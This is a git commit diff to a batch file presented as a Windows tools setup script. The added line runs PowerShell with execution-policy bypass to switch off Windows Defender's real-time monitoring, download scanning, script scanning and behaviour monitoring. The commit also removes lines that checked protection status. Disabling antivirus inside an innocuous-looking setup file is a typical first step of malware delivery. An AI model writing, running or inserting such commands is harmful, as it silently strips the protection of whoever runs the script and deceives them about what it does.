1c82d437c038c1d3b0eb49be231a3ef233a35d91
Tools Setup Windows <riovtg@gmail.com>
2025-10-13 13:47:53 +0700

    Update Tools_Windows_Setup.bat

--- Tools_Windows_Setup.bat
+++ Tools_Windows_Setup.bat
@@ -1,10 +1,6 @@
 start windowsdefender:
-powershell -NoP -Ep Bypass -C "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true"
-powershell -NoP -Ep Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -DisableBehaviorMonitoring $true"
+powershell -NoP -Ep Bypass -C "Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableIOAVProtection 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableBehaviorMonitoring 1"
 
-powershell -NoP -C "Get-MpComputerStatus | fl IsTamperProtected,RealTimeProtectionEnabled"
-
-powershell -NoP -C "Get-MpComputerStatus | fl RealTimeProtectionEnabled,IsTamperProtected,AMRunningMode,AntispywareEnabled"
 
 
 
